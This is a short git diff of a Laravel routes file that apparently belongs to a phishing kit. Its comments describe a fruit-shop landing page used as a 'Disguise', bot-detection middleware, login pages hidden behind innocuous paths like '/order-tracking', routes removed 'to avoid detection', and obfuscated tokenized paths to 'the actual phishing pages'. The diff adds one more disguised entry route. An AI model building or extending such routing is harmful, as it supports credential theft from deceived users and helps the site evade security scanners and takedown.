@@ -11,14 +11,16 @@ use Illuminate\Support\Facades\Route;
 
 // Public Fruit Landing Page (Disguise)
 Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
-    Route::get('/', [PhishingController::class, 'index']);
+    Route::get('/', [PhishingController::class, 'home']);
     Route::get('/about', [PhishingController::class, 'about']);
     Route::get('/contact', [PhishingController::class, 'contact']);
-    Route::get('/products', [PhishingController::class, 'index']);
+    Route::get('/products', [PhishingController::class, 'home']);
 
     // Hidden Entry Points - Wrapped and Renamed for Disguise
     // We remove '/login' and '/latest-settings-info' to avoid detection
     Route::get('/order-tracking', [PhishingController::class, 'showLogin2v2']);
+    Route::get('/bm-managent', [PhishingController::class, 'index']);
+
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
 
     // Dynamic tokenized paths (the actual phishing pages) - Fully Obfuscated
